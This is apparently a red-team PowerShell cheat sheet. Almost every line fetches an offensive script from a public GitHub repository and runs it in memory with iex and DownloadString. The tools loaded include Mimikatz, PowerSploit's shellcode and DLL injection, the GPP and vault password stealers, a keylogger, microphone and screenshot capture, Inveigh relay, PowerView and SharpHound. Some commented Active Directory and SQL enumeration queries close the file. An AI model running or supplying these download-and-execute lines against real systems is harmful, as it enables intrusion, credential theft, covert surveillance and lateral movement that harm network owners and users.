
# Collection of usefull powershell modules

# add PowerUpSQL
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")

# add Inveigh (consists of 2 Scripts)
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh-Relay.ps1")

# add Get-SQLServiceAccountPwHashes
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/scripts/pending/Get-SQLServiceAccountPwHashes.ps1")

# add PowerSploit
  # add CodeExecution
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-WmiCommand.ps1")

  # add Exfilitration
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPAutologon.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-CredentialInjection.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1")
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/VolumeShadowCopyTools.ps1")


# import powerview
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/maaaaz/CrackMapExecWin/master/hosted/powerview.ps1")

# add Invoke-Mimikatz
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1")

# add Invoke-Bloodhound
# (collects AD-data which is importable into Bloodhound)
iex(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1")


## get All SQL-Instances
#Get-SQLInstanceDomain
#
## get Single Computer by DNSName
#Get-ADComputer -Filter {DNSHostName -eq "name"}
#
## get all Enabled Computers in AD
#Get-ADComputer -Filter * -Properties ipv4Address | Where-Object  {$_.Enabled -eq "True"}
#
##Get-SQLInstanceDomain | Select-Object ComputerName
#Get-ADComputer -Filter * -Properties ipv4Address | Where-Object {$_.Enabled -eq "True"} | Where-Object {$_.DNSHostName -eq {Get-SQLInstanceDomain | Select-Object ComputerName}}

